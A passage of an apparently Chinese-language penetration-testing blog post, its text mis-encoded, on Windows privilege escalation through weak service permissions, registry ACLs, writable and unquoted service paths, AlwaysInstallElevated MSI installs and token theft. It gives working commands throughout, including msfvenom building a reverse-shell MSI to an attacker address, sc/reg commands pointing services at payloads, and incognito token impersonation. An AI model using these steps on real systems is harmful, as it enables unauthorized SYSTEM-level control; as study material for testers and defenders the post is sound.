id="2-ç¡®å®šå¹¶åˆ©ç”¨æ¼æ´"><a href="#2-ç¡®å®šå¹¶åˆ©ç”¨æ¼æ´" class="headerlink" title="2.ç¡®å®šå¹¶åˆ©ç”¨æ¼æ´"></a>2.ç¡®å®šå¹¶åˆ©ç”¨æ¼æ´</h4><p>ç¡®è®¤æ¼æ´åï¼Œé€šè¿‡å„ç§æ–¹å¼æœå¯»æ¼æ´åˆ©ç”¨ç¨‹åºä¸Šä¼ åˆ©ç”¨ã€‚</p><h2 id="2-ç³»ç»ŸæœåŠ¡ææƒ"><a href="#2-ç³»ç»ŸæœåŠ¡ææƒ" class="headerlink" title="2.ç³»ç»ŸæœåŠ¡ææƒ"></a>2.ç³»ç»ŸæœåŠ¡ææƒ</h2><p>ä¸€äº›åº”ç”¨è½¯ä»¶ä¼šæ³¨å†Œä¸€äº›æœåŠ¡ï¼Œå¤§å¤šæ•°æœåŠ¡åœ¨è®¡ç®—æœºå¼€æœºæ—¶ä»¥SYSTEMæƒé™å¯åŠ¨ã€‚<br>åº”ç”¨è½¯ä»¶åœ¨æ³¨å†ŒæœåŠ¡æ—¶ï¼Œä¼šåœ¨ä»¥ä¸‹è·¯å¾„ä¸­åˆ›å»ºç›¸åº”çš„æ³¨å†Œè¡¨é¡¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services</span><br></pre></td></tr></table></figure><p>ä»¥GoogleUpdateä¸ºä¾‹<br>gupdateæœåŠ¡ImagePathæŒ‡å‘ç³»ç»ŸæœåŠ¡æ‰€å¯åŠ¨çš„äºŒè¿›åˆ¶ç¨‹åº<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309061052368.png" alt="image.png"><br>å¤§å¤šæ•°æœåŠ¡ä»¥SYSTEMæƒé™å¯åŠ¨ï¼Œå¦‚æœè®©æœåŠ¡å¯åŠ¨æ‰§è¡Œå…¶ä»–ç¨‹åºï¼Œè¯¥ç¨‹åºå°±èƒ½éšç€æœåŠ¡çš„å¯åŠ¨è·å¾—ç³»ç»Ÿæƒé™ï¼Œè¿™æ˜¯åˆ©ç”¨ç³»ç»ŸæœåŠ¡ææƒçš„ä¸»è¦æ€è·¯</p><h4 id="1-ä¸å®‰å…¨çš„æœåŠ¡æƒé™"><a href="#1-ä¸å®‰å…¨çš„æœåŠ¡æƒé™" class="headerlink" title="1.ä¸å®‰å…¨çš„æœåŠ¡æƒé™"></a>1.ä¸å®‰å…¨çš„æœåŠ¡æƒé™</h4><p>ACLå®šä¹‰å®‰å…¨å¯¹è±¡è®¿é—®æ§åˆ¶ç­–ç•¥ï¼Œç”¨äºè§„å®šå“ªäº›ä¸»ä½“å¯¹å…¶æ‹¥æœ‰è®¿é—®æƒé™å’Œæ‹¥æœ‰ä»€ä¹ˆæ ·çš„æƒé™<br>Windowsç³»ç»ŸæœåŠ¡é€šè¿‡ACLæ¥æŒ‡å®šç”¨æˆ·å¯¹å…¶æ‹¥æœ‰çš„æƒé™ã€‚<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309062153146.png" alt="image.png"></p><p>å‡è®¾ç›®æ ‡ä¸»æœºçš„ç”¨æˆ·åœ¨é…ç½®æœåŠ¡æ—¶å­˜åœ¨ç–å¿½ï¼Œä½¿å¾—ä½æƒé™ç”¨æˆ·å¯¹é«˜æƒé™ä¸‹è¿è¡Œçš„ç³»ç»ŸæœåŠ¡æ‹¥æœ‰æ›´æ”¹æœåŠ¡é…ç½®çš„æƒé™(SERVICE_QUERY_CONFIGæˆ–SERVICE_ALL_ACCESS),å°±å¯ä»¥é€šè¿‡è¿™ä¸ªä½æƒé™ç”¨æˆ·ç›´æ¥ä¿®æ”¹æœåŠ¡å¯åŠ¨æ—¶çš„äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„ã€‚</p><p>å®æˆ˜ä¸­AccessChkå·¥å…·å¯ä»¥æšä¸¾ç›®æ ‡ä¸»æœºä¸Šå­˜åœ¨æƒé™ç¼ºé™·çš„ç³»ç»ŸæœåŠ¡ã€‚AccessChkå¯ä»¥ç”¨æ¥æšä¸¾æˆ–æŸ¥çœ‹ç³»ç»Ÿä¸­æŒ‡å®šç”¨æˆ·ã€ç»„å¯¹ç‰¹å®šèµ„æºçš„è®¿é—®æƒé™ã€‚</p><p>ä½æƒé™ç”¨æˆ·å¯ä»¥é€šè¿‡å¯ä»¥é€šè¿‡æ£€æŸ¥â€Authenticated Usersâ€ç»„å’Œâ€INTERACTIVEâ€ç»„å¯¹ç³»ç»ŸæœåŠ¡çš„æƒé™ï¼Œ<br>1.å‰è€…ä¸ºç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ï¼ŒåŒ…å«ç³»ç»Ÿä¸­æ‰€æœ‰ä½¿ç”¨ç”¨æˆ·åã€å¯†ç ç™»å½•å¹¶é€šè¿‡éªŒè¯çš„è´¦æˆ·<br>2.åè€…ä¸ºäº¤äº’å¼ç”¨æˆ·ç»„ï¼ŒåŒ…å«ç³»ç»Ÿä¸­æ‰€æœ‰ç›´æ¥ç™»å½•åˆ°è®¡ç®—æœºè¿›è¡Œæ“ä½œçš„ç”¨æˆ·<br>é»˜è®¤æƒ…å†µä¸‹è¿™ä¸¤ä¸ªç»„ä¸ºè®¡ç®—æœºæœ¬åœ°â€œUsersâ€çš„æˆå‘˜ã€‚<br>ä¸‹è½½åœ°å€:<a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/accesschk">https://learn.microsoft.com/zh-cn/sysinternals/downloads/accesschk</a></p><p>1.æ£€æŸ¥Authenticated Users<br>æšä¸¾ç›®æ ‡ä¸»æœºâ€Authenticated Usersâ€ç»„æ˜¯å¦å…·æœ‰æ›´æ”¹æœåŠ¡é…ç½®çš„æƒé™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *</span><br></pre></td></tr></table></figure><p>2.è‹¥InsproSvcæœåŠ¡å…·æœ‰SERVICE_QUERY_CONFIGæƒé™ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œè¯¥æœåŠ¡å¯åŠ¨æ—¶æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶æ›¿æ¢ä¸ºé¢„å…ˆä¸Šä¼ çš„æ”»å‡»è½½è·ï¼Œå½“æœåŠ¡é‡å¯æ—¶ï¼Œè½½è·ä¼šéšç€æœåŠ¡çš„å¯åŠ¨ç»§æ‰¿ç³»ç»Ÿæƒé™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc config InsproSvc binpath= &quot;cmd.exe /k C:\Users\Public\reverse_tcp.exe&quot;</span><br><span class="line">#binpath,æŒ‡å®šæœåŠ¡çš„äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„,æ³¨æ„=åé¢å¿…é¡»æœ‰ä¸€ä¸ªç©ºæ ¼</span><br></pre></td></tr></table></figure><p>3.å¦‚æœå½“å‰ç”¨æˆ·å¯¹è¯¥æœåŠ¡æ‹¥æœ‰SERVICE_STOPå’ŒSERVICE_STARTæƒé™ï¼Œæ„å‘³ç€ç”¨æˆ·æ‹¥æœ‰å¯¹æœåŠ¡çš„é‡å¯æƒé™ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤é‡å¯æœåŠ¡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc stop &lt;Service Name&gt;</span><br><span class="line">sc start &lt;Service Name&gt;</span><br></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰æƒé™ï¼Œå¯ä»¥å¯¹å¯åŠ¨ç±»å‹ä¸ºâ€è‡ªåŠ¨â€çš„æœåŠ¡å°è¯•é€šè¿‡é‡æ–°å¯åŠ¨è®¡ç®—æœºçš„æ–¹æ³•æ¥å®ç°æœåŠ¡é‡å¯</p><h4 id="2-æœåŠ¡æ³¨å†Œè¡¨æƒé™è„†å¼±"><a href="#2-æœåŠ¡æ³¨å†Œè¡¨æƒé™è„†å¼±" class="headerlink" title="2.æœåŠ¡æ³¨å†Œè¡¨æƒé™è„†å¼±"></a>2.æœåŠ¡æ³¨å†Œè¡¨æƒé™è„†å¼±</h4><p>Â æ³¨å†Œè¡¨åˆ©ç”¨ACLæ¥ç®¡ç†ç”¨æˆ·å¯¹å…¶æ‰€æ‹¥æœ‰çš„è®¿é—®æƒé™ï¼Œè‹¥ACLé…ç½®é”™è¯¯ï¼Œä½¿å¾—ä¸€ä¸ªä½æƒé™çš„ç”¨æˆ·å¯¹æœåŠ¡çš„æ³¨å†Œè¡¨æ‹¥æœ‰å†™å…¥æƒé™ï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨æ›´æ”¹æœåŠ¡é…ç½®<br>1.æšä¸¾Authenticated Usersç”¨æˆ·ç»„æ‹¥æœ‰å†™å…¥æƒé™çš„æœåŠ¡æ³¨å†Œè¡¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">accesschk.exe /accepteula -uvwqk &quot;Authenticated Users&quot; HKLM\SYSTEM\CurrentControlSet\Services</span><br></pre></td></tr></table></figure><p>2.Authenticated Usersç”¨æˆ·ç»„å¯¹RegSvcæœåŠ¡çš„æ³¨å†Œè¡¨æ‹¥æœ‰å®Œå…¨æ§åˆ¶æƒé™ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ä¸Šä¼ payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RegSvc /v ImagePath /t REG_EXPAND_SZ /d &quot;cmd.exe /k C:\Users\Public\reverse_tcp.exe&quot; /f</span><br></pre></td></tr></table></figure><p>3.æŸ¥çœ‹å½“å‰å‘½ä»¤æ˜¯å¦æœ‰é‡å¯æƒé™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">accesschk.exe /accepteula -ucqv &quot;Authenticated Users&quot; RegSvc</span><br></pre></td></tr></table></figure><p>å¦‚æœå¯ä»¥é‡å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stop RegSvc</span><br><span class="line">Start RegSvc</span><br></pre></td></tr></table></figure><p>getuid å‘ç°ä¸ºsystemæƒé™</p><h4 id="3-æœåŠ¡è·¯å¾„æƒé™å¯æ§"><a href="#3-æœåŠ¡è·¯å¾„æƒé™å¯æ§" class="headerlink" title="3.æœåŠ¡è·¯å¾„æƒé™å¯æ§"></a>3.æœåŠ¡è·¯å¾„æƒé™å¯æ§</h4><p>å¦‚æœä½æƒé™ç”¨æˆ·å¯¹æ­¤æœåŠ¡è°ƒç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶æˆ–è·¯å¾„å…·æœ‰å†™å…¥æƒé™ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥å°†è¯¥æ–‡ä»¶æ›¿æ¢æˆæ”»å‡»è½½è·<br>1.æŸ¥çœ‹InsexeSvcæœåŠ¡çš„äºŒè¿›åˆ¶æ–‡ä»¶æ‰€åœ¨ç›®å½•æ˜¯å¦å…·æœ‰å†™å…¥æƒé™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">accesschk.exe /accepteula -quv &quot;C:\Program Files\Insecure Executables\&quot;</span><br></pre></td></tr></table></figure><p>2.è‹¥å…·æœ‰æ§åˆ¶æƒï¼Œæµ‹è¯•äººå‘˜å¯ä»¥å°†InsexeSvcæœåŠ¡çš„äºŒè¿›åˆ¶æ–‡ä»¶æ›¿æ¢æˆä¸€ä¸ªåŒåçš„æ”»å‡»è½½è·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;cd &quot;C:\Program Files\Insecure Executables&quot;</span><br><span class="line">meterpreter&gt;cp InsexeSvc.exe InsexeSvc.exe.bat</span><br><span class="line">meterpreter&gt;upload /root/reverse_tcp.exe &quot;C:\Program Files\Insecure Executables\InsexeSvc.exe&quot;</span><br><span class="line">meterpreter&gt;shell</span><br><span class="line">C:&gt;shutdown -r -t 0</span><br><span class="line">meterpreter&gt;getuid å¾—åˆ°ç³»ç»Ÿæƒé™</span><br></pre></td></tr></table></figure><h4 id="4-æœªå¼•ç”¨çš„æœåŠ¡è·¯å¾„"><a href="#4-æœªå¼•ç”¨çš„æœåŠ¡è·¯å¾„" class="headerlink" title="4.æœªå¼•ç”¨çš„æœåŠ¡è·¯å¾„"></a>4.æœªå¼•ç”¨çš„æœåŠ¡è·¯å¾„</h4><p>å½“æœåŠ¡å¯åŠ¨æ‰€æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶çš„è·¯å¾„åŒ…å«ç©ºæ ¼ä¸”æœªæœ‰æœ‰æ•ˆåŒ…å«åœ¨å¼•å·ä¸­æ—¶ï¼Œå°±ä¼šå¯¼è‡´è¯¥æ¼æ´<br>å½“ç³»ç»Ÿä¸€æ¬¡å°è¯•æœåŠ¡è·¯å¾„çš„ç©ºæ ¼æ—¶ï¼Œä¼šä»¥å½“å‰æ‰€æ‹¥æœ‰æƒé™è¿›è¡Œ<br>æµ‹è¯•äººå‘˜å¯ä»¥å°†ä¸€ä¸ªç»è¿‡ç‰¹æ®Šå‘½åçš„payloadä¸Šä¼ åˆ°å—å½±å“çš„ç›®å½•ä¸­</p><p>1.æšä¸¾ç›®æ ‡ä¸»æœºä¸Šæ‰€æœ‰è¯¥æ¼æ´çš„ç³»ç»ŸæœåŠ¡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic service get DisplayName,PathName,StartMode|findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309131840106.png" alt="image.png"></p><p>2.ç”¨Accesschkæ£€æŸ¥å—å½±å“ç›®å½•ï¼Œå‘ç°å½“å‰ç”¨æˆ·å¯¹å—å½±å“çš„ç›®å½•æ‹¥æœ‰å®Œå…¨æ§åˆ¶æƒé™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">accesschk.exe /accepteula -quv &quot;Authenticated Users&quot; &quot;C:\Program Files\Upquoted Path\&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309131841613.png" alt="image.png"></p><p>å¯ä»¥å‘C:\Program Files\nquoted Pathä¸Šä¼ ä¸€ä¸ªåä¸ºSub.exeçš„æ”»å‡»è½½è·ï¼ŒæœåŠ¡é‡å¯åæ£€æŸ¥è·¯å¾„æ£€æŸ¥åˆ°Sub.exeæ—¶å³ä¼šå°†æ”»å‡»åœ¨å’Œä»¥SYSTEMæƒé™è¿è¡Œ</p><p>ä¸ºäº†é¿å…è¯¥æ¼æ´ï¼Œä½¿ç”¨scåˆ›å»ºç³»ç»ŸæœåŠ¡æ—¶ï¼Œåº”æœ‰æ•ˆåœ°å¯¹å­˜åœ¨ç©ºæ ¼çš„æœåŠ¡å™¨è·¯å¾„ä½¿ç”¨å¼•å·è¿›è¡ŒåŒ…è£¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc create TestSvc binpath= &quot;\&quot;C:\Program Files\Sub Dir\Program Name.exe\&quot;&quot;</span><br></pre></td></tr></table></figure><h4 id="5-PowerUp"><a href="#5-PowerUp" class="headerlink" title="5.PowerUp"></a>5.PowerUp</h4><p><a href="https://github.com/mdand2000/PowerShellEmpire-PowerTools">GitHub - mdand2000&#x2F;PowerShellEmpire-PowerTools</a><br><a href="https://wooyun.js.org/drops/Powershell%20%E6%8F%90%E6%9D%83%E6%A1%86%E6%9E%B6-Powerup.html">Powershell ææƒæ¡†æ¶-Powerup - Evi1cg</a></p><h2 id="3-MSIå®‰è£…ç­–ç•¥ææƒ"><a href="#3-MSIå®‰è£…ç­–ç•¥ææƒ" class="headerlink" title="3.MSIå®‰è£…ç­–ç•¥ææƒ"></a>3.MSIå®‰è£…ç­–ç•¥ææƒ</h2><p>MSIæ˜¯å¾®è½¯æ ¼å¼çš„åº”ç”¨ç¨‹åºå®‰è£…åŒ…ï¼Œæ˜¯ä¸€ä¸ªæ•°æ®åº“ï¼ŒåŒ…å«å®‰è£…å’Œå¸è½½è½¯ä»¶æ—¶éœ€è¦ä½¿ç”¨çš„å¤§é‡æŒ‡ä»¤å’Œç¨‹åºæ•°æ®ã€‚<br>ç”¨æˆ·åœ¨é…ç½®MSIå®‰è£…ç­–ç•¥æ—¶è‹¥å¯ç”¨â€œæ°¸è¿œä»¥é«˜ç‰¹æƒè¿›è¡Œå®‰è£…â€ï¼Œä½¿å¾—ä»»ä½•æƒé™çš„ç”¨æˆ·éƒ½å¯ä»¥é€šè¿‡SYSTEMæƒé™å®‰è£…MSIæ–‡ä»¶ã€‚</p><p>æµ‹è¯•äººå‘˜å¯ä»¥åœ¨ç›®æ ‡ä¸»æœºä¸Šå®‰è£…ä¸€ä¸ªé¢„å…ˆåˆ¶ä½œçš„æ¶æ„MSIæ–‡ä»¶ä»¥è·å¾—SYSTEMæƒé™</p><h4 id="1-ç¡®å®šç³»ç»Ÿæ˜¯å¦å­˜åœ¨æ¼æ´"><a href="#1-ç¡®å®šç³»ç»Ÿæ˜¯å¦å­˜åœ¨æ¼æ´" class="headerlink" title="1.ç¡®å®šç³»ç»Ÿæ˜¯å¦å­˜åœ¨æ¼æ´"></a>1.ç¡®å®šç³»ç»Ÿæ˜¯å¦å­˜åœ¨æ¼æ´</h4><p>æˆåŠŸåˆ©ç”¨AlwaysInstallElevatedæ˜¯ç”¨æˆ·åœ¨é…ç½®MSIå®‰è£…ç­–ç•¥æ—¶å¯åŠ¨äº†æ°¸è¿œä»¥é«˜ç‰¹æƒè¿›è¡Œå®‰è£…ï¼Œè¯¥é¡¹å¯ç”¨åï¼Œç³»ç»Ÿä¼šåœ¨æ³¨å†Œè¡¨çš„ä»¥ä¸‹ä¸¤ä¸ªä½ç½®åˆ›å»ºé”®å€¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309071429958.png" alt="image.png"></p><p>æµ‹è¯•äººå‘˜å¯ä»¥æŸ¥è¯¢ç¡®å®šç³»ç»Ÿæ˜¯å¦å¼€å¯AlwaysInstallElevatedé€‰é¡¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309071430196.png" alt="image.png"></p><h4 id="2-åˆ›å»ºæ¶æ„MSIå¹¶å®‰è£…"><a href="#2-åˆ›å»ºæ¶æ„MSIå¹¶å®‰è£…" class="headerlink" title="2.åˆ›å»ºæ¶æ„MSIå¹¶å®‰è£…"></a>2.åˆ›å»ºæ¶æ„MSIå¹¶å®‰è£…</h4><p>msfç”Ÿæˆmsi</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.89.131 LPORT=44554 -f msi -o reverse_tcp.msi</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309071516905.png" alt="image.png"></p><p>å…ˆæ‹¿åˆ°æ™®é€šç”¨æˆ·æƒé™<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309071514966.png" alt="image.png"></p><p>å°†ç”Ÿæˆçš„msiä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºä¸Š,ç­‰å¦ä¸€å°ä¸»æœºå¼€å¯ç›‘å¬åç”¨msiexecè¿è¡Œmsiå®‰è£…æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msiexec /quiet /qn /i reverse_tcp.msi</span><br><span class="line">#/quiet Â å®‰è£…æœŸé—´ç¦æ­¢å‘ç”¨æˆ·å‘é€ä»»ä½•æ¶ˆæ¯</span><br><span class="line">#/qn Â  Â  æ— GUIæ¨¡å¼</span><br><span class="line">#/i Â  Â  Â å¸¸è§„å®‰è£…</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309071520003.png" alt="image.png"></p><p>å†å¼€ä¸€ä¸ªmsfconsole ç›‘å¬44554ç«¯å£<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309071519974.png" alt="image.png"></p><p>è¿è¡Œmsiexec,åœ¨ç¬¬äºŒä¸ªmsfconsoleä¸ŠæˆåŠŸä¸Šçº¿<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309071631845.png" alt="image.png"></p><p>æˆåŠŸææƒè‡³systemæƒé™</p><h2 id="4-è®¿é—®ä»¤ç‰Œæ“çºµ"><a href="#4-è®¿é—®ä»¤ç‰Œæ“çºµ" class="headerlink" title="4.è®¿é—®ä»¤ç‰Œæ“çºµ"></a>4.è®¿é—®ä»¤ç‰Œæ“çºµ</h2><p>Windowsçš„è®¿é—®æ§åˆ¶æ¨¡å‹ç”±è®¿é—®ä»¤ç‰Œå’Œå®‰å…¨æè¿°ç¬¦ä¸¤éƒ¨åˆ†ç»„æˆï¼Œæ˜¯Windowsç³»ç»Ÿå®‰å…¨æ€§çš„åŸºç¡€æ„å»º<br>ä¸¤éƒ¨åˆ†åˆ†åˆ«è¢«è®¿é—®è€…å’Œè¢«è®¿é—®è€…é”æŒæœ‰ã€‚</p><h4 id="1-è®¿é—®ä»¤ç‰Œ"><a href="#1-è®¿é—®ä»¤ç‰Œ" class="headerlink" title="1.è®¿é—®ä»¤ç‰Œ"></a>1.è®¿é—®ä»¤ç‰Œ</h4><p>è®¿é—®ä»¤ç‰Œï¼šæè¿°è¿›ç¨‹æˆ–çº¿ç¨‹çš„ä¸Šä¸‹æ–‡å¯¹è±¡ï¼ŒåŒ…å«ä¸è¿›ç¨‹æˆ–çº¿ç¨‹å…³è”çš„ç”¨æˆ·è´¦æˆ·çš„æ ‡è¯†å’Œç‰¹æƒç­‰ä¿¡æ¯ã€‚</p><p>Windowsçš„ä»¤ç‰Œå¯ä»¥åˆ†ä¸ºä¸»ä»¤ç‰Œå’Œæ¨¡æ‹Ÿä»¤ç‰Œã€‚</p><p>ä¸»ä»¤ç‰Œä¸è¿›ç¨‹ç›¸å…³è”ï¼Œæ˜¯ç”±Windowså†…æ ¸åˆ›å»ºå¹¶åˆ†é…ç»™è¿›ç¨‹çš„é»˜è®¤è®¿é—®ä»¤ç‰Œï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸ªä¸»ä»¤ç‰Œï¼Œæè¿°äº†ä¸å½“å‰è¿›ç¨‹å…³è”çš„ç”¨æˆ·è´¦æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ï¼Œè¿›ç¨‹çš„çº¿ç¨‹ä¸å®‰å…¨å¯¹è±¡äº¤äº’æ—¶ï¼Œä¼šä½¿ç”¨ä¸»ä»¤ç‰Œã€‚</p><p>çº¿ç¨‹å¯ä»¥æ¨¡æ‹Ÿå®¢æˆ·ç«¯è´¦æˆ·ã€‚æ¨¡æ‹Ÿæ˜¯æŒ‡çº¿ç¨‹åœ¨å®‰å…¨ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œçš„èƒ½åŠ›ï¼Œå¹¶ä¸”è¯¥ä¸Šä¸‹æ–‡ä¸åŒäºæ‹¥æœ‰è¯¥çº¿ç¨‹çš„è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ã€‚å½“çº¿ç¨‹æ¨¡æ‹Ÿå®¢æˆ·ç«¯æ—¶ï¼Œæ¨¡æ‹Ÿçº¿ç¨‹å°†åŒæ—¶å…·æœ‰ä¸»è®¿é—®ä»¤ç‰Œå’Œæ¨¡æ‹Ÿä»¤ç‰Œã€‚</p><p>é€šè¿‡æ“ä½œè®¿é—®ä»¤ç‰Œï¼Œä½¿æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹çœ‹èµ·æ¥åƒæ˜¯å…¶ä»–è¿›ç¨‹çš„å­è¿›ç¨‹æˆ–å±äºå…¶ä»–ç”¨æˆ·æ‰€å¯åŠ¨çš„è¿›ç¨‹ã€‚ä½¿ç”¨Windows APIä»æŒ‡å®šçš„è¿›ç¨‹ä¸­å¤åˆ¶è®¿é—®ä»¤ç‰Œï¼Œå¹¶å°†å¾—åˆ°çš„è®¿é—®ä»¤ç‰Œç”¨äºç°æœ‰è¿›ç¨‹æˆ–ç”Ÿæˆæ–°è¿›ç¨‹ä»è€Œè¾¾åˆ°æƒé™æå‡å¹¶ç»•è¿‡è®¿é—®æ§åˆ¶ã€‚è¿™ä¸ªè¿‡ç¨‹è¢«ç§°ä¸ºä»¤ç‰Œçªƒå–ã€‚<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309071649308.png" alt="image.png"><br>æ³¨æ„:ä»¤ç‰Œçªƒå–åªèƒ½åœ¨ç‰¹æƒç”¨æˆ·ä¸Šä¸‹æ–‡ä¸­æ‰èƒ½å®Œæˆ,å› ä¸ºé€šè¿‡ä»¤ç‰Œåˆ›å»ºè¿›ç¨‹ä½¿ç”¨çš„CreateProcessWithTokenWå’ŒCreateProcessAsUserA ä¸¤ä¸ªWindows Windows APIåˆ†åˆ«è¦æ±‚ç”¨æˆ·å¿…é¡»æ‹¥æœ‰SeImpersonatePrivilege å’Œ SeAssignPrimaryTokenPrivilege&#x2F;SeIncreaseQuotaPrivilegeç‰¹æƒ,è€Œæ‹¥æœ‰è€…ä¸¤ä¸ªç‰¹æƒçš„ç”¨æˆ·ä¸€èˆ¬ä¸ºç³»ç»Ÿç®¡ç†å‘˜è´¦æˆ·ã€ç½‘ç»œæœåŠ¡ç®¡ç†å‘˜è´¦æˆ·å’Œç³»ç»ŸæœåŠ¡è´¦æˆ·ã€‚</p><h4 id="2-å¸¸è§„ä»¤ç‰Œçªƒå–æ“ä½œ"><a href="#2-å¸¸è§„ä»¤ç‰Œçªƒå–æ“ä½œ" class="headerlink" title="2.å¸¸è§„ä»¤ç‰Œçªƒå–æ“ä½œ"></a>2.å¸¸è§„ä»¤ç‰Œçªƒå–æ“ä½œ</h4><p>å¸¸è§„ä»¤ç‰Œçªƒå–é€šå¸¸ç”¨äºç®¡ç†å‘˜æå‡è‡³SYSTEMã€TrustedInstallerç­‰æ›´é«˜æƒé™ã€‚</p><h5 id="1-åˆ©ç”¨incognito-exeçªƒå–ä»¤ç‰Œ"><a href="#1-åˆ©ç”¨incognito-exeçªƒå–ä»¤ç‰Œ" class="headerlink" title="1.åˆ©ç”¨incognito.exeçªƒå–ä»¤ç‰Œ"></a>1.åˆ©ç”¨incognito.exeçªƒå–ä»¤ç‰Œ</h5><p>incognito.exeå¯ä»¥åœ¨Windowsç³»ç»Ÿä¸Šå®ç°ä»¤ç‰Œçªƒå–<br>é¡¹ç›®åœ°å€:<a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip" title="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip">https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</a><br>a.å°†incognito.exeä¸Šä¼ ï¼Œæ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">incognito.exe list_tokens -u</span><br></pre></td></tr></table></figure><p>åˆ—å‡ºä¸»æœºä¸Šæ‰€æœ‰è®¿é—®ä»¤ç‰Œ<br>æŸ¥çœ‹æ‹¥æœ‰æ›´é«˜è´¦æˆ·çš„æƒé™çš„è®¿é—®ä»¤ç‰Œ</p><p>b.æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">incognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; whoami</span><br><span class="line">#-cå‚æ•°åä¸ºè¦åˆ‡å–å¾—ä»¤ç‰Œï¼Œ</span><br><span class="line">#whoamiæ—¶çªƒå–ä»¤ç‰Œåè¦æ‰§è¡Œçš„å‘½ä»¤</span><br></pre></td></tr></table></figure><p>çªƒå–NT AUTHORITY\SYSTEMè´¦æˆ·çš„è®¿é—®ä»¤ç‰Œå¹¶åˆ›å»ºè¿›ç¨‹</p><p>c.æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">incognito.exe execute -c &quot;HACK-MY\Marcus&quot; cmd</span><br></pre></td></tr></table></figure><p>çªƒå–åŸŸç”¨æˆ·Marcusçš„è®¿é—®ä»¤ç‰Œï¼Œå®ç°æœ¬åœ°ç®¡ç†å‘˜åˆ°åŸŸç”¨æˆ·çš„åˆ‡æ¢</p><h5 id="2-åˆ©ç”¨MetaSploitçªƒå–ä»¤ç‰Œ"><a href="#2-åˆ©ç”¨MetaSploitçªƒå–ä»¤ç‰Œ" class="headerlink" title="2.åˆ©ç”¨MetaSploitçªƒå–ä»¤ç‰Œ"></a>2.åˆ©ç”¨MetaSploitçªƒå–ä»¤ç‰Œ</h5><p>metasploitå†…ç½®incognito</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 